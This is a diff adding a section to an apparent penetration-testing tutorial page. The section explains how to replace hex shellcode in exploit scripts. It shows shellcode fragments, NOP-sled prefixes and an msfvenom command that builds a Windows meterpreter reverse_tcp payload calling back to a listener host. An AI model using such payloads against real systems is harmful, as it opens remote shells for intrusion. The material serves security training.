@@ -33,6 +33,31 @@
                     <p>Configure it using the same payload that you used to created in msfvenom</p>
             </ul>
 
+            <h2>Modifying payloads from exploits</h2>
+            <ul>
+                <p>In some cases you'll find that the exploit you would like to use contains a payload sections with a bunch of hex encoded content. Just like:</p>
+                <pre><code class="language-bash">"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+"\x52\x31\x72\x17\x83\xc2\x04\x03\xd7\xdf\xca\x6c\xeb\x08\x88"
+"\x8f\x13\xc9\xed\x06\xf6\xf8\x2d\x7c\x73\xaa\x9d\xf6\xd1\x47"</code></pre>
+                <p>This payload can be generated using msfveom. Here is an example</p>
+                <pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.162 LPORT=1990 -f python -b "\x00\x20" -v shellcode"</code></pre>
+                <p>The result of that command can be pasted in the script. </p>
+                <p><b>-b</b> parameter is to avoid using certain chars, you can also use the following chars <b>\x00\x0a\x0d\x25\x26\x2b\x3d</b></p>
+                <p><b>-v</b> parametes is to append the word shellcode as a variable for the script. Just like</p>
+                <pre><code class="language-bash">shellcode += b"\xbb\xb4\xa4\x34\xc3\xdd\xc1\xd9\x74\x24\xf4\x5a\x33"
+shellcode += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x5e\x58\xd6"
+shellcode += b"\x36\x62\x49\x95\xb9\x9a\x8a\xfa\x30\x7f\xbb\x3a\x26"</code></pre>
+               <p>Remember that in some cases the first like of the payload must be a secuence of NOP parameters, just like...</p>
+               <pre><code class="language-bash">shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"   #NOP secuence
+shellcode += b"\xba\x4a\x84\xb4\x29\xda\xda\xd9\x74\x24\xf4"
+shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"</code></pre>
+                        
+                
+
+"
+
+            </ul>
+
             <h2>Post exploitation</h2>
             <ul>    
                 <p>Once you have a established reverse shell using meterpreter you can perform some post exploitation basics</p>
